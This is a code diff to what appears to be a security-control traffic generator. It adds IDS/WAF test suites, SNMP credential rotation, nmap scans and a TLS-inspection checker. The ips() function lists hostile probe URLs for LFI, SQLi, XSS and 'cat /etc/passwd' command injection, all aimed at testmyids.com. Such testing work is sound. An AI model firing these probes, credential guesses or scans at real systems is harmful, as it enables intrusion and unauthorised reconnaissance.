@@ -175,9 +175,6 @@ def progress_wait(seconds: int, label: str = "Waiting") -> None:
     """Animated countdown bar used between loop iterations."""
     if seconds <= 0:
         return
-    with _WEB_STATE_LOCK:
-        _WEB_STATE["wait_until"] = int(time.time()) + seconds
-    _web_flush()
     with Progress(
         SpinnerColumn(),
         TextColumn(f"[cyan]{label}[/]"),
@@ -192,9 +189,6 @@ def progress_wait(seconds: int, label: str = "Waiting") -> None:
         while not prog.finished:
             prog.update(task, completed=min(time.time() - start, seconds))
             time.sleep(0.1)
-    with _WEB_STATE_LOCK:
-        _WEB_STATE["wait_until"] = 0
-    _web_flush()
 
 
 def ui_startup_banner() -> None:
@@ -251,9 +245,12 @@ _SUITE_DESCRIPTIONS: list[tuple[str, str]] = [
     ("http3",            "HTTP/3 QUIC HEAD requests via curl --http3"),
     ("https",            "HTTPS HEAD requests + iterative crawl"),
     ("icmp",             "Ping + traceroute to a set of remote hosts"),
-    ("ids-trigger",      "BlackSun user-agent IDS/IPS trigger to testmyids.com"),
+    ("ids-trigger",      "16 Snort/Suricata signatures: scanner UAs + web-attack URL probes → testmyids.com"),
+    ("tls-check",        "Connect to 20 diverse HTTPS sites and report cert Subject/Issuer/expiry/fingerprint — detects TLS inspection proxy"),
     ("kyber",            "HTTPS HEAD with X25519MLKEM768 post-quantum curves"),
-    ("malware-agents",   "HEAD requests using known malware user-agents"),
+    ("lateral-movement", "Ping sweep /24 subnet + nmap lateral-movement ports (SSH/SMB/RDP/WMI/LDAP/Kerberos)"),
+    ("log4shell",        "Log4Shell JNDI header injection probes (CVE-2021-44228) → IDS/WAF/SASE"),
+    ("malware-agents",   "HEAD requests to malware-category URLs using C2 framework user-agents (SASE/NGFW)"),
     ("malware-download", "Download known-malware file samples (to /dev/null)"),
     ("metasploit-check", "Run Metasploit .rc check scripts (no exploitation)"),
     ("speedtest",        "fast.com speed-test via fastcli"),
@@ -261,12 +258,16 @@ _SUITE_DESCRIPTIONS: list[tuple[str, str]] = [
     ("ntp",              "NTP UDP probes to a pool of public time servers"),
     ("phishing-domains", "Probe random samples from active phishing domain list"),
     ("pornography",      "HTTPS crawl of adult-content endpoints"),
-    ("snmp",             "SNMPv2c walks with rotating community strings"),
+    ("shadow-it",        "HEAD requests to unsanctioned cloud apps (Dropbox/MEGA/Discord/Telegram/Crypto) — CASB app-control"),
+    ("snmp",             "SNMPv1/v2c/v3 walks with common community strings and credentials"),
     ("squatting",        "dnstwist typosquatting generation for popular domains"),
     ("s3",               "S3 upload/download simulation: GET public objects + PUT synthetic DLP payloads"),
     ("ssh",              "Non-interactive SSH connection attempts"),
+    ("tor-anonymizer",   "HEAD requests to Tor/VPN/proxy sites → URL-filter anonymizer category"),
     ("url-response",     "Measure HTTPS response times via requests library"),
     ("virus",            "Download known-virus samples (to /dev/null)"),
+    ("waf-attack",       "SQLi/XSS/LFI/SSRF/CMDi/XXE/SSTI payloads in query params and POST bodies → WAF inline"),
+    ("data-exfil-http",  "POST synthetic PII/credentials to paste sites → DLP + CASB outbound inspection"),
     ("web-scanner",      "Nikto web vulnerability scan"),
     ("all",              "Run every suite above in random order"),
 ]
@@ -456,6 +457,53 @@ class SuiteStats:
 _stats       = SuiteStats()   # per-function stats, reset before each function
 _suite_stats = SuiteStats()   # aggregate across all functions in a suite run
 
+# ── Ads blocklist pool ────────────────────────────────────────────────────────
+_ADS_BLOCKLIST_URL = (
+    "https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@latest/adblock/pro.txt"
+)
+# Fallback is the original static ad_endpoints list from endpoints.py
+_ads_pool: list  = []
+_ads_pool_lock   = threading.Lock()
+
+
+def _load_ads_pool() -> list:
+    """
+    Fetch Hagezi pro blocklist and parse all ||domain^ entries into a flat
+    list.  Result is cached for the lifetime of the process.  Falls back to
+    a small inline list if the CDN is unreachable.
+    """
+    global _ads_pool
+    with _ads_pool_lock:
+        if _ads_pool:
+            return _ads_pool
+        try:
+            console.log(f"[cyan]ads:[/] fetching Hagezi pro blocklist…")
+            resp = requests.get(_ADS_BLOCKLIST_URL, timeout=(5, 30), verify=True)
+            resp.raise_for_status()
+            domains: list = []
+            for line in resp.text.splitlines():
+                line = line.strip()
+                if not line or line[0] in ("!", "[", "@"):
+                    continue
+                if line.startswith("||"):
+                    domain = line[2:].split("^")[0].split("/")[0].lower()
+                    if domain and "." in domain and " " not in domain:
+                        domains.append(domain)
+            if domains:
+                _ads_pool = domains
+                console.log(
+                    f"[cyan]ads:[/] loaded {len(_ads_pool):,} domains "
+                    f"from Hagezi pro blocklist"
+                )
+            else:
+                _ads_pool = ad_endpoints[:]
+                console.log("[yellow]ads:[/] blocklist parse returned 0 domains — using original static list")
+        except Exception as exc:
+            _ads_pool = ad_endpoints[:]
+            console.log(f"[yellow]ads:[/] blocklist fetch failed ({exc}) — using original static list")
+        return _ads_pool
+
+
 # ── Web UI shared state ───────────────────────────────────────────────────────
 _WEB_STATE_FILE  = "/tmp/traffgen_state.json"
 _WEB_LOG_FILE    = "/tmp/traffgen_log.jsonl"
@@ -467,7 +515,8 @@ _WEB_STATE: dict = {
     "version": "", "started_at": 0.0, "suite": "all", "size": "S",
     "max_wait_secs": 20, "loop": True, "current_test": "", "iteration": 0,
     "status": "starting",   # running | between_tests | paused | stopped
-    "test_started_at": 0.0, "wait_until": 0,
+    "pause_until": 0.0,     # epoch seconds when current inter-test pause ends (0 = not pausing)
+    "test_started_at": 0.0,
     "tests": {}, "suites": [],
     "totals": {"attempts": 0, "ok": 0, "fail": 0, "blocked": 0, "dropped": 0, "allowed": 0},
     "history": [{"t": int(__import__("time").time()), "ok": 0, "fail": 0}], "events": [],
@@ -753,6 +802,7 @@ def _popen_kill_group(cmd: str, timeout: int,
 _SUITE_TIMEOUTS: dict[str, int] = {
     "metasploit_check":   360,
     "web_scanner":        300,
+    "lateral_movement_sim": 480,
     "nmap_1024os":        210,
     "nmap_cve":           210,
     "bigfile":            180,
@@ -1232,15 +1282,17 @@ def ai_https_random() -> None:
 
 def ads_random() -> None:
     """
-    HEAD requests to ad-network, analytics, and tracker endpoints.
+    HEAD requests to a random sample of domains from the Hagezi pro blocklist
+    (300k+ ad/tracker/malware domains).  Fetched once at first call and cached
+    for the process lifetime; falls back to a small inline list on failure.
     Exercises ad-blocking and tracker-blocking URL filter categories.
     """
-    ui_banner("Ad / Tracker HEAD", "Ad & analytics endpoint pool")
+    pool = _load_ads_pool()
+    n    = _size_to_limits(ARGS.size, 10, 25, 50, 200)
+    sample = random.sample(pool, min(n, len(pool)))
+    ui_banner("Ad / Tracker HEAD", f"{n} domains sampled from {len(pool):,}-entry Hagezi pro blocklist")
     try:
-        n = _size_to_limits(ARGS.size, 10, 20, 50, len(ad_endpoints))
-        random.shuffle(ad_endpoints)
-        _run_head_batch(ad_endpoints[:n], "ADS", user_agents,
-                        connect_timeout=3, max_time=5)
+        _run_head_batch(sample, "ADS", user_agents, connect_timeout=3, max_time=5)
         ui_ok("Ads test complete")
     except Exception as e:
         _stats.fail()
@@ -1287,15 +1339,20 @@ def pornography_crawl() -> None:
 
 def malware_random() -> None:
     """
-    HEAD requests to known malware / C2 domains using realistic malware
-    user-agents.  Tests whether threat-intel feed blocks fire correctly.
-    No payload is downloaded — HEAD only.
+    HEAD requests to malware-category test URLs (WICAR, AMTSO, Google Safe
+    Browsing test domains) using known C2 framework user-agents.
+
+    The URL destinations trigger URL-category blocks on any SASE/NGFW with
+    GSB or AMTSO integration.  The user-agents (Cobalt Strike, Meterpreter,
+    Empire, DarkComet, etc.) trigger C2 UA detection rules independently.
+    Together they exercise both the URL-intel and UA-behavioural detection
+    paths of SASE/SSE/NGFW platforms.
     """
     ui_banner("Malware Agents (HEAD)", "Known malware domains with malware UAs")
     try:
         n = _size_to_limits(ARGS.size, 10, 20, 50, len(malware_endpoints))
         random.shuffle(malware_endpoints)
-        _run_head_batch(malware_endpoints[:n], "MALWARE", malware_user_agents,
+        _run_head_batch(malware_endpoints[:n], "MALWARE", c2_user_agents,
                         connect_timeout=3, max_time=5)
         ui_ok("Malware agent HEAD complete")
     except Exception as e:
@@ -1372,40 +1429,123 @@ def metasploit_check() -> None:
         ui_error(f"[metasploit_check] {e}")
 
 
-def snmp_random() -> None:
+def _snmp_record(returncode: int, ip: str, label: str) -> None:
+    """Classify an snmpwalk result into allowed / dropped / fail."""
+    if returncode == 0:
+        _stats.ok()
+    elif returncode == 1:
+        # rc=1: no response (timeout/filtered) — treat as dropped
+        _stats.drop()
+    else:
+        _stats.fail()
+
+
+def snmp_v1() -> None:
     """
-    SNMPv2c walks on `snmp_endpoints` using community strings from
-    `snmp_strings`.  Low retry counts (-r1 -t1) avoid long waits on
-    non-responsive hosts.
+    SNMPv1 GET-NEXT walks using common community strings seen in the wild.
+    Walks the system MIB (1.3.6.1.2.1.1) only — fast and enough to exercise
+    IDS SNMP-community signatures.
     """
-    n = _size_to_limits(ARGS.size, 1, 2, 5, len(snmp_endpoints))
-    ui_banner("SNMP Walk", f"{n} hosts")
+    n = _size_to_limits(ARGS.size, 1, 2, 4, len(snmp_endpoints))
+    ui_banner("SNMP v1", f"{n} hosts × rotating community strings")
     try:
-        random.shuffle(snmp_endpoints)
-        random.shuffle(snmp_strings)
-        with Progress(SpinnerColumn(), TextColumn("[cyan]SNMP[/]"),
-                      MofNCompleteColumn(), BarColumn(), TimeElapsedColumn(),
-                      console=console) as prog:
-            task = prog.add_task("snmp", total=n)
-            for i, ip in enumerate(snmp_endpoints[:n], 1):
-                community = snmp_strings[i % len(snmp_strings)]
-                console.log(f"snmpwalk ({i}/{n}) {ip}  community={community}")
-                try:
-                    subprocess.run(
-                        ["snmpwalk", "-v2c", "-t1", "-r1", "-c", community, ip, "1.3.6"],
-                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
-                        timeout=15,
-                    )
-                    _stats.ok()
-                except Exception as e:
-                    console.log(f"[yellow]snmp {ip}: {e}[/]")
-                    _stats.fail()
-                finally:
-                    prog.update(task, advance=1)
-        ui_ok("SNMP complete")
+        hosts = random.sample(snmp_endpoints, min(n, len(snmp_endpoints)))
+        for i, ip in enumerate(hosts, 1):
+            community = random.choice(snmp_v1_strings)
+            console.log(f"snmpwalk v1 ({i}/{n}) {ip}  community={community!r}")
+            try:
+                result = subprocess.run(
+                    ["snmpwalk", "-v1", "-t2", "-r1", "-c", community,
+                     ip, "1.3.6.1.2.1.1"],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
+                    timeout=8,
+                )
+                _snmp_record(result.returncode, ip, "v1")
+            except subprocess.TimeoutExpired:
+                _stats.drop()
+            except Exception as e:
+                console.log(f"[yellow]snmp v1 {ip}: {e}[/]")
+                _stats.fail()
+        ui_ok("SNMP v1 complete")
     except Exception as e:
         _stats.fail()
-        ui_error(f"[snmp_random] {e}")
+        ui_error(f"[snmp_v1] {e}")
+
+
+def snmp_v2c() -> None:
+    """
+    SNMPv2c GET-BULK walks using an expanded set of common community strings.
+    Exercises SNMP community-brute and policy-violation signatures.
+    """
+    n = _size_to_limits(ARGS.size, 1, 2, 5, len(snmp_endpoints))
+    ui_banner("SNMP v2c", f"{n} hosts × rotating community strings")
+    try:
+        hosts = random.sample(snmp_endpoints, min(n, len(snmp_endpoints)))
+        for i, ip in enumerate(hosts, 1):
+            community = random.choice(snmp_v2c_strings)
+            console.log(f"snmpwalk v2c ({i}/{n}) {ip}  community={community!r}")
+            try:
+                result = subprocess.run(
+                    ["snmpwalk", "-v2c", "-t2", "-r1", "-c", community,
+                     ip, "1.3.6.1.2.1.1"],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
+                    timeout=8,
+                )
+                _snmp_record(result.returncode, ip, "v2c")
+            except subprocess.TimeoutExpired:
+                _stats.drop()
+            except Exception as e:
+                console.log(f"[yellow]snmp v2c {ip}: {e}[/]")
+                _stats.fail()
+        ui_ok("SNMP v2c complete")
+    except Exception as e:
+        _stats.fail()
+        ui_error(f"[snmp_v2c] {e}")
+
+
+def snmp_v3() -> None:
+    """
+    SNMPv3 probes cycling through common default credentials at all three
+    security levels: noAuthNoPriv, authNoPriv (MD5/SHA), and authPriv
+    (DES/AES).  Exercises SNMPv3 weak-credential and brute-force signatures.
+    """
+    n = _size_to_limits(ARGS.size, 1, 2, 4, len(snmp_endpoints))
+    ui_banner("SNMP v3", f"{n} hosts × rotating credentials")
+    try:
+        hosts  = random.sample(snmp_endpoints, min(n, len(snmp_endpoints)))
+        creds  = random.sample(snmp_v3_creds, min(len(snmp_v3_creds), max(n, 3)))
+        pairs  = [(hosts[i % len(hosts)], creds[i % len(creds)])
+                  for i in range(max(n, len(creds)))]
+        random.shuffle(pairs)
+        for i, (ip, cred) in enumerate(pairs[:max(n, len(creds))], 1):
+            user, level, auth_proto, auth_pass, priv_proto, priv_pass = cred
+            console.log(
+                f"snmpwalk v3 ({i}) {ip}  user={user!r} level={level}"
+                + (f" auth={auth_proto}" if auth_proto else "")
+                + (f" priv={priv_proto}" if priv_proto else "")
+            )
+            cmd = ["snmpwalk", "-v3", "-t2", "-r1", "-l", level, "-u", user]
+            if auth_proto:
+                cmd += ["-a", auth_proto, "-A", auth_pass]
+            if priv_proto:
+                cmd += ["-x", priv_proto, "-X", priv_pass]
+            cmd += [ip, "1.3.6.1.2.1.1"]
+            try:
+                result = subprocess.run(
+                    cmd,
+                    stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
+                    timeout=8,
+                )
+                _snmp_record(result.returncode, ip, "v3")
+            except subprocess.TimeoutExpired:
+                _stats.drop()
+            except Exception as e:
+                console.log(f"[yellow]snmp v3 {ip}: {e}[/]")
+                _stats.fail()
+        ui_ok("SNMP v3 complete")
+    except Exception as e:
+        _stats.fail()
+        ui_error(f"[snmp_v3] {e}")
 
 
 def traceroute_random() -> None:
@@ -1490,6 +1630,25 @@ def speedtest_fast() -> None:
         ui_error(f"[speedtest_fast] {e}")
 
 
+def _nmap_classify(stdout: str) -> tuple[int, int, int]:
+    """Parse nmap grepable output and return (open, closed, filtered) port counts."""
+    open_c = closed_c = filtered_c = 0
+    for line in stdout.splitlines():
+        if not (line.startswith("Host:") and "Ports:" in line):
+            continue
+        for entry in line.split("Ports:", 1)[1].split(","):
+            parts = entry.strip().split("/")
+            if len(parts) >= 2:
+                state = parts[1]
+                if state == "open":
+                    open_c += 1
+                elif state == "closed":
+                    closed_c += 1
+                elif "filtered" in state:
+                    filtered_c += 1
+    return open_c, closed_c, filtered_c
+
+
 def nmap_1024os() -> None:
     """
     Nmap port scan covering ports 1-1024 on sampled `nmap_endpoints`.
@@ -1501,15 +1660,24 @@ def nmap_1024os() -> None:
         random.shuffle(nmap_endpoints)
         for i, ip in enumerate(nmap_endpoints[:n], 1):
             console.log(f"nmap 1-1024 ({i}/{n}) {ip}")
-            cmd = (
-                f"nmap -Pn -p 1-1024 {ip} -T4 "
-                f"--max-retries 0 --max-parallelism 2 "
-                f"--randomize-hosts --host-timeout 1m --script-timeout 1m "
-                f'--script-args http.useragent="Mozilla/5.0" -debug'
-            )
             try:
-                _popen_kill_group(cmd, timeout=120, stdout=None, stderr=None)
-                _stats.ok()
+                result = subprocess.run(
+                    ["nmap", "-Pn", "-p", "1-1024", ip, "-T4",
+                     "--max-retries", "0", "--max-parallelism", "2",
+                     "--randomize-hosts", "--host-timeout", "1m",
+                     "--script-timeout", "1m", "-oG", "-"],
+                    capture_output=True, text=True, timeout=120,
+                )
+                open_c, closed_c, filtered_c = _nmap_classify(result.stdout)
+                console.log(f"  ↳ {ip}  open:{open_c}  closed:{closed_c}  filtered:{filtered_c}")
+                if open_c:
+                    _stats.ok()
+                elif closed_c and not filtered_c:
+                    _stats.block()
+                elif filtered_c:
+                    _stats.drop()
+                else:
+                    _stats.fail()
             except Exception as e:
                 console.log(f"[yellow]nmap {ip}: {e}[/]")
                 _stats.fail()
@@ -1532,15 +1700,24 @@ def nmap_cve() -> None:
         random.shuffle(nmap_endpoints)
         for i, ip in enumerate(nmap_endpoints[:n], 1):
             console.log(f"nmap --script=ALL ({i}/{n}) {ip}")
-            cmd = (
-                f"nmap -sV --script=ALL {ip} -T4 "
-                f"--max-retries 0 --max-parallelism 2 "
-                f"--randomize-hosts --host-timeout 1m --script-timeout 1m "
-                f'--script-args http.useragent="Mozilla/5.0" -debug'
-            )
             try:
-                _popen_kill_group(cmd, timeout=120, stdout=None, stderr=None)
-                _stats.ok()
+                result = subprocess.run(
+                    ["nmap", "-sV", "--script=ALL", ip, "-T4",
+                     "--max-retries", "0", "--max-parallelism", "2",
+                     "--randomize-hosts", "--host-timeout", "1m",
+                     "--script-timeout", "1m", "-oG", "-"],
+                    capture_output=True, text=True, timeout=120,
+                )
+                open_c, closed_c, filtered_c = _nmap_classify(result.stdout)
+                console.log(f"  ↳ {ip}  open:{open_c}  closed:{closed_c}  filtered:{filtered_c}")
+                if open_c:
+                    _stats.ok()
+                elif closed_c and not filtered_c:
+                    _stats.block()
+                elif filtered_c:
+                    _stats.drop()
+                else:
+                    _stats.fail()
             except Exception as e:
                 console.log(f"[yellow]nmap {ip}: {e}[/]")
                 _stats.fail()
@@ -1882,28 +2059,62 @@ def webcrawl() -> None:
 
 def ips() -> None:
     """
-    Send a HEAD request to testmyids.com using the "BlackSun" user-agent,
-    which matches a classic Snort/Suricata IPS signature.  Confirms that
-    IPS alert rules are active and generating events.
+    Fire a battery of HTTP requests that each match a well-known Snort /
+    Suricata / Emerging Threats signature category:
+      • Scanner user-agents (BlackSun, ZmEu, Havij, sqlmap, Nikto, Acunetix,
+        w3af, masscan, DirBuster, libwww-perl)
+      • Web-attack URL probes (LFI, SQLi, XSS, .env, wp-admin, cmd injection)
+
+    All requests target testmyids.com — an Emerging Threats service that exists
+    solely for IDS validation — so no third-party hosts are scanned.
+
+    Note: these signatures are for inline network IDS/IPS (Snort, Suricata,
+    Cisco FTD, Palo Alto NGFW).  SASE/SSE platforms rely on URL-category and
+    behavioural analysis; use the http/https/malware-* suites for those.
     """
-    ui_banner("IDS/IPS Trigger", "BlackSun UA → testmyids.com")
-    try:
-        console.log("HEAD www.testmyids.com  User-Agent: BlackSun")
-        result = subprocess.run(
-            ["curl", "-k", "-s", "--show-error", "--connect-timeout", "3",
-             "-I", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5",
-             "-A", "BlackSun", "www.testmyids.com"],
-            capture_output=True, text=True,
-            timeout=10,
-        )
-        status = result.stdout.strip()
-        console.log(f"  ↳ [{_status_style(status)}]HTTP {status}[/]  (IDS signature: BlackSun UA)")
-        _stats.record(status)
-        ui_ok("IDS/IPS trigger complete")
-    except Exception as e:
-        _stats.fail()
-        _stats.fail()
-        ui_error(f"[ips] {e}")
+    # (label, url, extra curl args)
+    _TRIGGERS = [
+        # ── Scanner user-agent triggers ───────────────────────────────────────
+        ("BlackSun UA",          "http://www.testmyids.com", ["-A", "BlackSun"]),
+        ("ZmEu UA",              "http://www.testmyids.com", ["-A", "ZmEu"]),
+        ("Havij UA",             "http://www.testmyids.com", ["-A", "Havij"]),
+        ("sqlmap UA",            "http://www.testmyids.com", ["-A", "sqlmap/1.7.8#stable"]),
+        ("Nikto UA",             "http://www.testmyids.com", ["-A", "Nikto/2.1.6"]),
+        ("Acunetix UA",          "http://www.testmyids.com", ["-A", "acunetix-wvs-scanner/10"]),
+        ("w3af UA",              "http://www.testmyids.com", ["-A", "w3af.org"]),
+        ("masscan UA",           "http://www.testmyids.com", ["-A", "masscan/1.0"]),
+        ("DirBuster UA",         "http://www.testmyids.com", ["-A", "DirBuster-1.0-RC1"]),
+        ("libwww-perl UA",       "http://www.testmyids.com", ["-A", "libwww-perl/6.15"]),
+        # ── Web-attack URL pattern triggers ───────────────────────────────────
+        ("LFI probe",            "http://www.testmyids.com/../../etc/passwd",           []),
+        ("SQLi probe",           "http://www.testmyids.com/?id=1+UNION+SELECT+1,2--",   []),
+        ("XSS probe",            "http://www.testmyids.com/?q=%3Cscript%3Ealert(1)%3C/script%3E", []),
+        (".env probe",           "http://www.testmyids.com/.env",                        []),
+        ("wp-admin probe",       "http://www.testmyids.com/wp-admin/",                   ["-A", "ZmEu"]),
+        ("cmd-injection probe",  "http://www.testmyids.com/?cmd=cat+/etc/passwd",        []),
+    ]
+
+    ui_banner("IDS/IPS Trigger", f"{len(_TRIGGERS)} signatures → testmyids.com")
+    ok_count = 0
+    for label, url, extra in _TRIGGERS:
+        try:
+            console.log(f"  {label:<24}  {url}")
+            result = subprocess.run(
+                ["curl", "-k", "-s", "--show-error", "--connect-timeout", "3",
+                 "-I", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5"]
+                + extra + [url],
+                capture_output=True, text=True,
+                timeout=10,
+            )
+            status = result.stdout.strip()
+            console.log(f"    ↳ [{_status_style(status)}]HTTP {status}[/]")
+            _stats.record(status)
+            ok_count += 1
+        except Exception as e:
+            _stats.fail()
+            console.log(f"    ↳ [yellow]error: {e}[/]")
+        time.sleep(random.uniform(0.3, 0.8))
+    ui_ok(f"IDS/IPS trigger complete  ({ok_count}/{len(_TRIGGERS)} sent)")
 
 
 def web_scanner() -> None:
@@ -2172,7 +2383,7 @@ def c2_beacon() -> None:
             task = prog.add_task("c2", total=beacons)
             for i in range(1, beacons + 1):
                 target = random.choice(c2_beacon_targets)
-                ua     = random.choice(malware_user_agents)
+                ua     = random.choice(c2_user_agents)
                 # Encode random bytes as the fake "check-in" payload.
                 payload = base64.b64encode(os.urandom(48)).decode()
                 jitter  = random.uniform(1, 5)
@@ -2858,6 +3069,888 @@ def scrape_iterative(base_url: str, iterations: int = 3) -> None:
 
 
 # ══════════════════════════════════════════════════════════════════════════════
+# NEW DETECTION SUITES
+# ══════════════════════════════════════════════════════════════════════════════
+
+def tls_inspection_check() -> None:
+    """
+    Connect to 20 diverse HTTPS endpoints and report the presented TLS
+    certificate for each — Subject CN, Issuer (CN + Org), expiry, SHA-256
+    fingerprint, and verification status against the system trust store.
+
+    Primary purpose: validate that TLS inspection (MITM decryption) is working
+    correctly end-to-end from this container's perspective.
+
+    Reading the results:
+      CLEAN        — original site certificate received; proxy is NOT decrypting
+                     this destination, or no proxy is present.
+      INTERCEPTED  — issuer matches a known SASE/SSE/proxy vendor CA (Zscaler,
+                     Netskope, Palo Alto, Fortinet, Cato, Cisco, etc.), or the
+                     same CA is signing certs for multiple unrelated sites.
+      UNVERIFIED   — a certificate was presented but it does not validate against
+                     the container's trust store.  The proxy CA is re-signing but
+                     has not been installed — inject it via EXTRA_CA_CERT or a
+                     bind-mounted .crt file so other suites work cleanly.
+
+    Selective bypass: if some hosts are CLEAN and others are INTERCEPTED, the
+    proxy has a category-bypass or ASN-bypass rule.  Finance and government
+    domains are commonly bypassed; social and developer sites are often not.
+    """
+    import hashlib as _hashlib
+
+    _PROBE_HOSTS = [
+        # CDN / infrastructure
+        "www.cloudflare.com",
+        "one.one.one.one",
+        "www.digicert.com",
+        # Major cloud / SaaS
+        "www.google.com",
+        "www.microsoft.com",
+        "www.apple.com",
+        "www.amazon.com",
+        "login.microsoftonline.com",
+        # Developer tools (commonly inspected)
+        "github.com",
+        "api.github.com",
+        "pypi.org",
+        "hub.docker.com",
+        # Social / media
+        "www.youtube.com",
+        "www.facebook.com",
+        "www.reddit.com",
+        "www.linkedin.com",
+        # Finance (often bypassed / whitelisted by proxies)
+        "www.bankofamerica.com",
+        "www.wellsfargo.com",
+        # Government (often bypassed)
+        "www.irs.gov",
+        "www.nist.gov",
+    ]
+
+    # Maps lowercase search token → canonical display name shown in alerts.
+    # Longer/more-specific strings listed first so they match before shorter prefixes.
+    _PROXY_VENDOR_MAP: list[tuple[str, str]] = [
+        ("zscaler",          "Zscaler"),
+        ("netskope",         "Netskope"),
+        ("palo alto",        "Palo Alto Networks"),
+        ("prisma",           "Palo Alto Prisma"),
+        ("fortigate",        "Fortinet (FortiGate)"),
+        ("fortinet",         "Fortinet"),
+        ("cato networks",    "Cato Networks"),
+        ("cato ",            "Cato Networks"),
+        ("cisco umbrella",   "Cisco Umbrella"),
+        ("cisco",            "Cisco"),
+        ("umbrella",         "Cisco Umbrella"),
+        ("blue coat",        "Broadcom Blue Coat"),
+        ("bluecoat",         "Broadcom Blue Coat"),
+        ("symantec",         "Broadcom/Symantec"),
+        ("broadcom",         "Broadcom"),
+        ("forcepoint",       "Forcepoint"),
+        ("websense",         "Forcepoint/Websense"),
+        ("iboss",            "iboss"),
+        ("check point",      "Check Point"),
+        ("contentkeeper",    "ContentKeeper"),
+        ("ironport",         "Cisco IronPort"),
+        ("barracuda",        "Barracuda"),
+        ("watchguard",       "WatchGuard"),
+        ("skyhigh",          "Skyhigh Security"),
+        ("mcafee",           "McAfee/Trellix"),
+        ("trend micro",      "Trend Micro"),
+        ("sophos",           "Sophos"),
+        ("mitmproxy",        "mitmproxy"),
+        ("fiddler",          "Fiddler"),
+        ("portswigger",      "Burp Suite"),
+        ("burp",             "Burp Suite"),
+        ("charles proxy",    "Charles Proxy"),
+        ("charles",          "Charles Proxy"),
+        ("proxyman",         "Proxyman"),
+        ("squid",            "Squid Proxy"),
+    ]
+
+    def _detect_vendor(issuer_cn: str, issuer_org: str) -> str:
+        combined = (issuer_cn + " " + issuer_org).lower()
+        for token, display in _PROXY_VENDOR_MAP:
+            if token in combined:
+                return display
+        return ""
+
+    def _get_field(d: dict, section: str, field: str) -> str:
+        for rdns in d.get(section, ()):
+            for attr, val in rdns:
+                if attr == field:
+                    return val
+        return ""
+
+    def _probe_host(host: str) -> dict:
+        result = {
+            "host": host, "subject_cn": "", "issuer_cn": "", "issuer_org": "",
+            "not_after": "", "fingerprint": "", "verified": False,
+            "error": "", "status": "ERROR", "proxy_vendor": "",
+        }
+        try:
+            # ── Fetch cert (no verification so we always get something) ───────
+            ctx_noverify = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            ctx_noverify.check_hostname = False
+            ctx_noverify.verify_mode    = ssl.CERT_NONE
+            with socket.create_connection((host, 443), timeout=5) as raw:
+                with ctx_noverify.wrap_socket(raw, server_hostname=host) as s:
+                    cert_der  = s.getpeercert(binary_form=True)
+                    cert_dict = s.getpeercert()   # parsed (may be sparse with CERT_NONE)
+
+            if not cert_der:
+                result["error"] = "no cert returned"
+                return result
+
+            # SHA-256 fingerprint of DER-encoded leaf cert
+            result["fingerprint"] = _hashlib.sha256(cert_der).hexdigest()
+
+            # ── Parse subject / issuer from getpeercert() dict ─────────────
+            # With CERT_NONE, getpeercert() may return an empty dict; fall back
+            # to openssl x509 text parsing via a subprocess.
+            result["subject_cn"] = _get_field(cert_dict, "subject", "commonName")
+            result["issuer_cn"]  = _get_field(cert_dict, "issuer",  "commonName")
+            result["issuer_org"] = _get_field(cert_dict, "issuer",  "organizationName")
+            result["not_after"]  = cert_dict.get("notAfter", "")
+
+            # Fall back to openssl if getpeercert() returned empty fields
+            if not result["subject_cn"] and not result["issuer_cn"]:
+                pem = ssl.DER_cert_to_PEM_cert(cert_der)
+                try:
+                    r = subprocess.run(
+                        ["openssl", "x509", "-noout",
+                         "-subject", "-issuer", "-enddate"],
+                        input=pem, capture_output=True, text=True, timeout=5,
+                    )
+                    for line in r.stdout.splitlines():
+                        if line.startswith("subject="):
+                            m = re.search(r"CN\s*=\s*([^,/\n]+)", line)
+                            if m:
+                                result["subject_cn"] = m.group(1).strip()
+                        elif line.startswith("issuer="):
+                            m = re.search(r"CN\s*=\s*([^,/\n]+)", line)
+                            if m:
+                                result["issuer_cn"] = m.group(1).strip()
+                            m2 = re.search(r"O\s*=\s*([^,/\n]+)", line)
+                            if m2:
+                                result["issuer_org"] = m2.group(1).strip()
+                        elif line.startswith("notAfter="):
+                            result["not_after"] = line.split("=", 1)[1].strip()
+                except Exception:
+                    pass
+
+            # ── Verify against system trust store ─────────────────────────
+            try:
+                ctx_verify = ssl.create_default_context()
+                with socket.create_connection((host, 443), timeout=5) as raw2:
+                    with ctx_verify.wrap_socket(raw2, server_hostname=host):
+                        result["verified"] = True
+            except ssl.SSLCertVerificationError:
+                result["verified"] = False
+            except Exception:
+                result["verified"] = False  # network error on second conn is OK
+
+            # ── Classify ─────────────────────────────────────────────────────
+            vendor = _detect_vendor(result["issuer_cn"], result["issuer_org"])
+            if vendor:
+                result["status"]       = "INTERCEPTED"
+                result["proxy_vendor"] = vendor
+            elif not result["verified"]:
+                result["status"] = "UNVERIFIED"
+            else:
+                result["status"] = "CLEAN"
+
+        except (socket.timeout, socket.gaierror, ConnectionRefusedError,
+                OSError) as e:
+            result["error"]  = str(e)[:60]
+            result["status"] = "UNREACHABLE"
+        except Exception as e:
+            result["error"]  = str(e)[:60]
+            result["status"] = "ERROR"
+        return result
+
+    ui_banner("TLS Inspection Check",
+              f"Probing {len(_PROBE_HOSTS)} hosts for certificate details")
+
+    # ── Probe all hosts concurrently ──────────────────────────────────────────
+    results: list[dict] = [{}] * len(_PROBE_HOSTS)
+    with ThreadPoolExecutor(max_workers=8) as pool:
+        futures = {pool.submit(_probe_host, h): i
+                   for i, h in enumerate(_PROBE_HOSTS)}
+        for fut in futures:
+            results[futures[fut]] = fut.result()
+
+    # ── Print certificate table ───────────────────────────────────────────────
+    from rich.table import Table as _Table
+
+    tbl = _Table(show_header=True, header_style="bold magenta",
+                 show_lines=False, box=None, pad_edge=False)
+    tbl.add_column("Host",         style="cyan",  no_wrap=True, min_width=26)
+    tbl.add_column("Subject CN",   style="white", no_wrap=True, min_width=20)
+    tbl.add_column("Issuer / Proxy",               no_wrap=True, min_width=32)
+    tbl.add_column("Expires",      style="dim",   no_wrap=True, min_width=18)
+    tbl.add_column("SHA-256 (16)", style="dim",   no_wrap=True, min_width=16)
+    tbl.add_column("Status",                       no_wrap=True, min_width=14)
+
